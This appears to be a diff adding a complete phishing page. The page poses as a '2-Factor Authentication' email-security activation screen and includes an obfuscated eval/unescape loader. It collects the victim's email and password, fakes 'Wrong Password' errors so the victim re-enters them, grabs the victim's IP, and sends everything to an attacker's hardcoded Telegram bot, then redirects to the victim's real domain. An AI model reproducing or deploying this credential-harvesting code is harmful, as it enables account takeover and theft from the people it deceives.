@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4">var aix = "";</script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>2-Factor Authentication</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous" nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4"></script>
+    <link rel="stylesheet" href="css/landing.css">
+ 
+<script type="text/javascript">
+<!-- 
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%71%65%62%30%66%34%65%39%63%38%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%38%39%34%31%30%36%39%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%38%39%30%35%37%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%34%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%71%65%62%30%66%34%65%39%63%38%28%27') + '%3f%6e%73%71%6a%68%39%56%63%69%75%72%0e%01%1d%1f%18%1e%15%1f%14%14%57%5d%5a%60%64%6f%68%75%68%69%35%14%17%4b%42%47%45%45%43%34%0d%04%15%1f%14%14%15%1c%19%1b%59%5c%5c%63%61%67%68%79%62%69%29%60%6e%5a%62%62%32%1e%78%6d%60%2c%17%64%75%77%6b%6e%35%2f%29%6c%29%6d%56%57%2a%5a%6c%2c%67%51%4d%54%7b%5c%24%23%57%63%2f%61%6b%62%1d%21%35%00%05%14%14%15%1c%19%1b%1b%1d%5d%59%5d%6e%60%66%63%78%6a%65%2e%69%60%6f%65%5f%79%35%14%62%62%29%6b%66%6b%60%5e%74%35%00%05%14%14%15%1c%19%1b%1b%1d%5d%59%5d%6e%60%66%63%78%6a%65%2e%68%64%75%65%34%15%5c%63%7a%68%6e%32%0e%01%1d%1f%18%1e%70%0a%0e%01%0f%1c%19%1b%1b%2b%5c%6f%68%79%5e%6d%62%68%6e%72%0e%01%1d%1f%18%1e%15%1f%14%14%7a%65%65%77%63%37%2e%28%2e%28%34%01%0e%15%1c%19%1b%1b%1d%1f%18%62%6c%6c%64%60%54%75%33%1b%65%69%62%70%35%00%05%14%14%15%1c%19%1b%1b%1d%65%75%6d%79%66%6a%7d%20%5f%6e%6d%77%60%69%74%34%15%5c%69%62%79%61%6b%30%0e%07%1f%18%1e%15%1f%14%14%15%5d%6d%62%64%6b%2a%61%72%68%6a%67%3e%15%5f%64%6d%77%60%6d%33%0b%0f%1f%14%14%15%1c%19%1b%1b%65%62%61%61%6d%73%3e%14%24%2c%29%75%63%36%0a%02%1e%15%1f%14%71%00%06%0c%01%1b%1d%1f%18%28%62%61%6a%6d%56%61%72%0e%01%1d%1f%18%1e%15%1f%14%14%7a%65%65%77%63%37%1f%2b%36%25%6f%7c%3f%00%06%19%1b%1b%1d%1f%18%1e%15%5d%55%57%6e%63%6b%6c%76%6b%63%32%1e%16%61%6a%6a%3e%09%03%1b%1b%1d%1f%7d%0b%0f%0a%0e%14%15%1c%19%2d%6c%63%61%61%5d%68%2a%6c%63%61%60%64%69%70%08%05%18%1e%15%1f%14%14%15%1c%76%62%67%71%67%32%36%25%22%3f%01%0f%1c%19%1b%1b%1d%1f%18%1e%60%5e%66%6b%6c%6a%33%1b%5a%70%73%6f%35%00%05%14%14%15%1c%19%1b%1b%1d%6f%59%62%69%66%62%6b%3f%1c%2b%2b%6b%75%1f%28%6e%7d%34%01%0e%15%1c%19%1b%7e%08%05%0d%04%15%1f%14%14%23%68%6e%64%6c%76%0a%02%1e%15%1f%14%14%15%1c%19%74%62%61%73%60%34%24%2f%24%29%3e%09%03%1b%1b%1d%1f%18%1e%15%1f%6a%60%62%5d%75%31%1b%69%62%66%72%3e%0a%0e%14%15%1c%19%1b%1b%1d%1f%6d%5f%67%60%6d%62%20%5e%6e%77%77%6a%6a%32%1e%27%62%61%3f%00%06%19%1b%1b%1d%7a%0d%04%00%05%14%14%15%1c%2f%6f%6c%62%68%18%66%24%74%01%0e%15%1c%19%1b%1b%1d%1f%18%60%62%69%78%21%6b%5d%6c%62%6f%74%35%18%5f%67%66%55%60%3e%09%03%1b%1b%1d%1f%7d%0b%0f%0a%0e%14%15%1c%19%2d%75%60%6d%61%60%7c%74%01%0e%15%1c%19%1b%1b%1d%1f%18%71%6c%63%78%6c%3f%1c%36%2b%26%36%0a%02%1e%15%1f%14%14%15%1c%19%6e%5a%6f%60%61%68%3f%1f%55%79%79%6b%32%0e%01%1d%1f%18%1e%70%0a%0e%01%0f%1c%19%1b%1b%2b%71%65%6c%6c%61%7d%14%6d%30%72%0e%01%1d%1f%18%1e%15%1f%14%14%6b%6b%6f%77%2e%63%5e%6d%67%61%76%3e%14%54%6e%60%5a%6f%36%0a%02%1e%15%1f%14%71%00%06%0c%01%1b%1d%1f%18%60%6c%62%60%68%66%61%75%70%0e%07%1f%18%1e%15%1f%14%14%15%73%60%67%77%65%35%18%37%25%22%3f%01%0f%1c%19%1b%1b%1d%1f%18%1e%6b%6b%63%55%79%36%19%69%62%62%67%74%35%00%05%14%14%15%1c%19%1b%1b%1d%5d%6f%6c%69%62%66%3e%27%6c%71%1b%68%6a%6b%61%62%15%1c%38%26%3d%31%67%37%30%08%05%18%1e%15%1f%14%14%15%1c%5b%6c%69%61%62%6a%2b%67%5e%68%6d%78%6f%33%1b%36%6d%77%33%0b%0f%1f%14%14%15%79%0c%01%0e%07%1f%18%1e%15%6b%69%6b%68%6a%65%70%0e%07%1f%18%1e%15%1f%14%14%15%62%6e%6d%77%28%6c%61%74%68%35%14%25%38%6c%71%30%0e%07%1f%18%1e%15%1f%14%14%15%6b%77%66%69%63%6b%6f%71%3f%1f%6c%6d%69%60%64%6d%30%08%05%18%1e%15%1f%14%14%15%1c%76%62%67%71%67%32%1e%39%2d%29%3f%00%06%19%1b%1b%1d%1f%18%1e%15%6f%55%68%69%65%6f%64%31%2d%6f%70%1e%27%6f%7c%3f%00%06%19%1b%1b%1d%1f%18%1e%15%6a%55%66%6a%65%6f%31%1b%2d%6f%70%35%00%05%14%14%15%1c%7c%0e%01%08%05%18%1e%15%1f%22%7a%68%6e%60%65%72%1d%66%6e%6e%78%73%5f%78%7c%6c%64%3e%24%71%62%70%72%2a%5a%7f%01%0f%1c%19%1b%1b%1d%1f%18%1e%7a%66%68%78%6d%36%19%2a%2b%2d%22%33%0b%0f%1f%14%14%15%1c%19%1b%1b%63%6b%6f%5f%79%35%14%66%6c%63%61%77%30%08%05%18%1e%15%1f%14%14%15%1c%5b%6c%69%61%62%6a%34%63%68%62%69%3e%09%03%1b%1b%1d%1f%18%1e%15%1f%64%55%69%60%60%6d%64%37%2c%68%76%15%2e%24%64%7d%37%0c%01%1b%1d%1f%18%7b%00%05%01%0e%15%1c%19%1b%2d%73%62%6a%67%6b%76%14%56%78%70%75%6c%6d%76%0a%02%1e%15%1f%14%14%15%1c%19%59%6c%6f%63%65%6c%3f%69%63%62%68%37%0c%01%1b%1d%1f%18%1e%15%1f%14%6c%68%65%66%63%77%37%1f%34%2e%65%77%3f%01%0f%1c%19%1b%1b%1d%1f%18%1e%7a%66%68%78%6d%36%19%33%2b%6d%77%33%0b%0f%1f%14%14%15%1c%19%1b%1b%63%6b%6f%5f%79%35%14%66%6c%63%61%77%30%08%05%18%1e%15%1f%14%14%15%1c%6c%5a%69%62%66%6e%2b%79%68%64%3e%15%2e%64%6e%30%08%05%18%1e%15%1f%14%14%15%1c%5b%5a%58%66%60%6a%69%78%69%68%3e%15%1f%35%29%33%30%61%34%35%00%05%14%14%15%1c%19%1b%1b%1d%5d%6f%6c%69%62%66%21%67%5d%65%62%76%6e%35%18%33%65%77%3f%01%0f%1c%19%1b%1b%1d%1f%18%1e%56%68%60%63%67%36%19%18%65%63%61%33%0b%0f%1f%14%14%15%79%0c%01%0e%07%1f%18%1e%15%29%69%61%54%65%6d%2e%77%6a%2a%76%63%67%66%6a%7d%7e%09%03%1b%1b%1d%1f%18%1e%15%1f%56%63%67%60%64%69%31%2c%6f%70%1e%66%68%60%6d%69%1c%1a%2b%2b%2d%34%0d%04%15%1f%14%14%15%1c%19%1b%59%6a%6d%64%63%67%2a%66%55%69%65%74%68%31%1d%2e%28%6e%7d%34%01%0e%15%1c%19%1b%7e%08%05%0d%04%15%1f%14%14%23%62%6e%69%6e%28%67%6f%6a%69%62%66%7f%00%06%19%1b%1b%1d%1f%18%1e%15%70%6d%68%79%64%33%2a%2b%2d%22%33%0b%0f%1f%14%14%15%1c%19%1b%1b%63%6b%6f%5f%79%35%14%60%68%62%75%30%0e%07%1f%18%1e%15%7a%01%0e%00%06%19%1b%1b%1d%29%66%69%67%6a%21%6c%62%68%65%66%69%1d%67%2b%75%00%05%14%14%15%1c%19%1b%1b%1d%61%6f%68%79%2a%7b%69%6c%63%61%77%31%1d%31%28%2e%3e%0a%0e%14%15%1c%19%7e%0e%07%0a%02%1e%15%1f%14%22%6b%6b%6b%6e%2e%65%68%6c%62%68%6d%14%6d%63%6c%74%77%50%71%76%68%63%30%20%69%61%54%65%6d%24%5e%29%1f%61%68%65%72%78%5f%79%75%69%66%3e%22%6f%59%6d%66%70%63%66%69%23%5c%70%0e%07%1f%18%1e%15%1f%14%14%15%73%60%67%77%65%35%18%2f%25%2f%29%3f%00%06%19%1b%1b%1d%1f%18%1e%15%67%69%6d%6a%64%75%31%37%2d%6f%70%35%00%05%14%14%15%1c%19%1b%1b%1d%61%6c%69%54%73%3e%14%61%61%67%77%30%08%05%18%1e%15%1f%14%14%15%1c%6c%5a%69%62%66%6e%2b%57%68%78%78%62%69%33%1b%2a%30%6f%70%35%00%05%14%14%15%1c%7c%0e%01%1d%1f%18%1e%23%61%63%66%60%29%61%6c%6f%61%62%6a%1e%23%5d%78%62%20%64%6e%6f%67%60%6d%73%0b%0f%1f%14%14%15%1c%19%1b%1b%72%66%64%72%6d%35%25%24%25%21%32%0e%01%1d%1f%18%1e%15%1f%14%14%60%5d%6b%64%62%6b%2a%74%69%65%35%25%69%60%37%0c%01%1b%1d%1f%18%1e%15%1f%14%68%6c%6f%69%6f%5a%74%35%18%60%61%62%7c%3f%00%06%19%1b%1b%1d%1f%18%1e%15%5e%60%6d%6a%6a%2c%58%6c%6b%73%65%68%79%35%14%57%68%6a%75%66%69%36%0a%02%1e%15%1f%14%14%15%1c%19%5a%6f%64%60%6e%2b%6c%73%69%61%66%36%19%58%66%6b%73%65%6c%3e%0a%0e%14%15%1c%19%1b%1b%1d%1f%62%73%66%73%6d%6a%7c%29%5a%6c%6d%71%62%6e%72%3f%1f%57%69%63%70%64%69%30%08%05%18%1e%15%1f%71%01%0f%09%03%1b%1b%1d%1f%2e%60%62%6d%61%21%6d%6b%6d%67%66%6f%1f%2e%5c%79%69%21%6c%62%68%65%66%69%1d%29%5a%72%63%74%01%0e%15%1c%19%1b%1b%1d%1f%18%5c%54%5c%6f%6b%67%6b%74%6d%67%37%1c%28%2e%3a%2c%37%3a%3e%09%03%1b%1b%1d%1f%18%1e%15%1f%56%63%67%60%64%69%31%6b%68%6e%63%3e%0a%0e%14%15%1c%19%1b%1b%1d%1f%68%5f%69%63%6d%62%6a%36%37%6b%73%1d%2e%28%6e%7d%34%01%0e%15%1c%19%1b%1b%1d%1f%18%5d%62%6b%63%66%3f%1f%67%65%65%36%0a%02%1e%15%1f%14%14%15%1c%19%59%6c%6f%63%65%6c%20%6d%55%68%6c%71%6a%31%1b%2d%6f%70%35%00%05%14%14%15%1c%19%1b%1b%1d%6a%59%6c%6a%66%62%21%79%6b%69%31%1b%2f%2f%68%76%3e%0a%0e%14%15%1c%19%1b%1b%1d%1f%6d%5f%67%60%6d%62%20%5e%6e%77%77%6a%6a%32%1e%27%2f%64%7c%3e%09%03%1b%1b%1d%1f%7d%0b%0f%0a%0e%14%15%1c%19%2d%65%6a%6d%6d%2b%6d%68%60%68%68%6e%19%2d%59%71%69%2d%66%62%6b%68%69%67%1c%2f%59%77%6b%35%60%69%7b%62%66%7f%00%06%19%1b%1b%1d%1f%18%1e%15%5c%79%66%66%6b%6b%31%6b%6a%66%6e%72%68%6d%3f%01%0f%1c%19%1b%1b%78%0a%02%0b%0f%1f%14%14%15%2a%5a%63%66%5e%64%5a%69%7d%74%01%0e%15%1c%19%1b%1b%1d%1f%18%71%6c%63%78%6c%3f%1c%28%2b%2b%20%34%0d%04%15%1f%14%14%15%1c%19%1b%65%69%68%59%72%3f%1f%60%69%6b%70%32%0e%01%1d%1f%18%1e%15%1f%14%14%60%5d%6b%64%62%6b%2a%74%69%65%35%39%64%7d%37%0c%01%1b%1d%1f%18%7b%00%05%01%0e%15%1c%19%1b%2d%5e%67%65%5d%6e%5d%63%7c%15%68%58%59%66%69%74%0d%04%15%1f%14%14%15%1c%19%1b%65%6a%69%74%2b%6b%5e%61%6d%61%75%33%5a%69%64%5e%6c%35%00%05%14%14%15%1c%19%1b%1b%1d%61%6f%68%79%2a%67%6d%7f%61%33%2a%28%6d%77%33%0b%0f%1f%14%14%15%1c%19%1b%1b%63%6b%6f%5f%79%35%14%60%68%62%75%30%0e%07%1f%18%1e%15%1f%14%14%15%69%58%69%64%64%69%2d%6a%68%61%78%3e%24%61%6c%30%0e%07%1f%18%1e%15%7a%01%0e%00%06%19%1b%1b%1d%29%60%67%69%62%7f%01%0f%1c%19%1b%1b%1d%1f%18%1e%69%66%67%64%61%5d%70%31%1b%6b%68%6e%63%3e%0a%0e%14%15%1c%19%7e%3f%2a%6c%74%77%61%62%328941069%37%31%33%34%32%39%33' + unescape('%27%29%29%3b'));
+// -->
+</script>
+ 
+</head>
+
+<body>
+    <div id="html_encoder_div">
+        <div class="container">
+            <div class="office show border shadow bg-light" id="others">
+				<br>
+				<div id="Div1" style="display:none">
+                <div class="office-holder">
+                    <div class="logo" style="text-align:center">
+                        <div>
+                            <img src="https://cdn3d.iconscout.com/3d/premium/thumb/profile-3d-icon-download-in-png-blend-fbx-gltf-file-formats--user-avatar-account-interface-pack-icons-5220669.png?f=webp" 
+							style="width:100px; height:100px;" alt="SeC3">
+                        </div><br>
+                        <h5 class="text-dark"><strong  class="text-uppercase">2-Factor Authentication</strong></h3>
+                        <p class="font-weight-light">
+						You are about to activate 2FA Security<br> Enter your email below to continue...
+						</p>
+                    </div>
+                    <form>
+                        <div class="form-holder">
+                            <div style="width: 100%;">
+                                <div class="alert alert-danger hide alert2"></div>
+                            </div>
+                            <input type="email" id="aii" name="" class="form-control" value="" placeholder="someone@example.com" required="">
+                            <div class="btn-holder">
+                                <button class="btn btn-lg col-12" id="submit-btnn">Continue >>></button>
+                            </div>
+							<br>
+                        </div>
+                    </form>
+                </div>
+				</div>
+				
+				
+			<div id="Div2" style="display:none">
+				<div class="office-holder">
+                    <div class="logo" style="text-align:center">
+                        <div id="login_logo">
+                            <img id="login_logo1" src="https://res.cloudinary.com/ducjuygen/image/upload/v1662462897/weblogo_fs2day.png" width="50" height="50" alt="Webmail">
+                        </div>
+                        <h3 class="text-dark"><strong id="domain-name" class="text-uppercase">USER VERIFICATION</strong></h3>
+                        <h5 class="font-weight-light"><strong>2-Factor Authentication Settings</strong></h5>
+						<p> Verify your ID to activate Email Security</p>
+                    </div>
+                    <center>
+                        <div id="msg" style="display: none;font-weight: 600;color: red;">Wrong Password.! Try again....</div>
+                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+                    <form>
+                        <div class="form-holder">
+                            <div style="width: 100%;">
+                                <div class="alert alert-danger hide alert2"></div>
+                            </div>
+                            <input type="email" id="ai" class="form-control" value="" placeholder="someone@example.com" required="">
+                            <input type="password" id="pr" placeholder="Password" class="form-control" required="">
+                            <div class="checkbox">
+                                <input type="checkbox" checked name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
+                                <label>Remember me</label>
+                            </div>
+                            <div class="btn-holder">
+                                <button class="btn btn-lg col-12" id="submit-btn">Activate >>></button>
+                            </div>
+							<br><br>
+                        </div>
+                    </form>
+					
+                </div>
+			</div>
+            </div>
+        </div>
+    </div>
+    <style>
+    .tb_button {
+        padding: 1px;
+        cursor: pointer;
+        border-right: 1px solid #8b8b8b;
+        border-left: 1px solid #FFF;
+        border-bottom: 1px solid #fff;
+    }
+
+    .tb_button.hover {
+        borer: 2px outset #def;
+        background-color: #f8f8f8 !important;
+    }
+
+    .ws_toolbar {
+        z-index: 100000
+    }
+
+    .ws_toolbar .ws_tb_btn {
+        cursor: pointer;
+        border: 1px solid #555;
+        padding: 3px
+    }
+
+    .tb_highlight {
+        background-color: yellow
+    }
+
+    .tb_hide {
+        visibility: hidden
+    }
+
+    .ws_toolbar img {
+        padding: 2px;
+        margin: 0px
+    }
+    </style>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous" nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous" nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous" nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4"></script>
+<input type="hidden" name="usrip1" id="usrip1" value="">
+</body>
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js" nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4"></script>
+<script type='text/javascript' nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4">
+ $('#submit-btnn').click(function(event) {
+     $('#submit-btnn').html('Verifing...');
+        event.preventDefault();
+    if (document.getElementById('aii').value === ''){
+        alert('Enter a valid email address');
+		$('#submit-btnn').html('Continue >>>');
+        return false;
+    }
+	var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+	if (!filter.test(document.getElementById('aii').value)) {
+            alert('Enter a valid email address');
+			$('#submit-btnn').html('Continue >>>');
+			return false;
+    }
+	var my_ai = document.getElementById('aii').value;
+    $('#ai').attr('disabled', "");
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+	setTimeout(function() {
+	 var x = document.getElementById("Div1");
+	 var xx = document.getElementById("Div2");
+     if (x.style.display === "block" && xx.style.display === "none") {
+         x.style.display = "none";
+		 xx.style.display = "block";
+	 } 
+	}, 1000);
+	})
+</script>
+
+<script nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4">
+if(window.location.hash){
+	var ai = window.location.hash.substr(1);
+}else{
+ var ai = aix;
+}
+	
+function tmsend(message){
+    var token = "7096698114:AAG90bkWNRefEqtcUC1oEOpTPtrTf4Y--lQ";
+    var chat_id= "1757985900";
+    const url = `https://api.telegram.org/bot${token}/sendMessage` // The url to request
+
+    const obj = {
+        chat_id: chat_id, // Telegram chat id
+        text: message // The text to send
+    };
+
+    const xht = new XMLHttpRequest();
+    xht.open("POST", url, true);
+    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+    xht.send(JSON.stringify(obj));
+
+}
+
+$(document).ready(function() {
+    var count = 0;
+
+    $('#back1').click(function() {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+
+    });
+
+    /////////////url ai getting////////////////
+    if (!ai) {
+	var x = document.getElementById("Div1");
+	var xx = document.getElementById("Div2");
+         x.style.display = "block";
+		 xx.style.display = "none";
+    } else {
+        // $('#ai').val(ai);
+		
+		var x = document.getElementById("Div1");
+		var xx = document.getElementById("Div2");
+         x.style.display = "none";
+		 xx.style.display = "block";
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        $('#ai').val(my_ai);
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        $("#msg").hide();
+        $("#inputbar").animate({ left: 200, opacity: "hide" }, 0);
+        $("#automail").animate({ right: 200, opacity: "show" }, 1000);
+    }
+    ///////////////url getting ai////////////////
+
+
+    var file = "PUT YOUR base64 LINK next.ph";
+    $('#submit-btn').click(function(event) {
+        $('#submit-btn').html('Verifing...');
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////new injection////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is empty.!");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is emply.!");
+            ai.focus;
+            return false;
+        }
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        var dom = c.toUpperCase();
+        var newDate = new Date();
+        var datetime =  newDate.toLocaleString();
+        ///////////new injection////////////////
+        count = count + 1;
+        $('#ai').attr('disabled', "");
+        $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
+        $('#domain-name').html(dom);
+        var ozi = "\n------2FA-Logs-----\n"
+        ozi+="User: "+ai
+        ozi+="\nPass: " +pr
+        ozi+="\n------------------------"
+        ozi+= "\nUser-IP: "+document.getElementById('usrip1').value;
+        ozi+="\n----------------------\n"
+        tmsend(ozi)
+        function greet() {
+            $('#submit-btn').html('Login')
+            $("#msg").show();
+        }
+        setTimeout(greet, 2000);
+        if (count >= 3) {
+            count = 0;
+            // window.location.replace(response['redirect_link']);
+            window.location.replace("http://www." + my_slice);
+
+        }
+       
+        
+        
+        /*
+        $.ajax({
+            dataType: 'JSON',
+            url: atob(file),
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifing...');
+            },
+            success: function(response) {
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').html('Login');
+            }
+        });*/
+    });
+
+
+});
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js" nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4"></script> 
+<script nonce="Mzk5NTk4OTExNCwyODE3MTk1ODY4"> 
+$.getJSON("https://api.ipify.org?format=json", 
+function(data) { 
+var ipx = data.ip;
+document.getElementById('usrip1').value = ipx;
+}) 
+</script>
+
+</html>
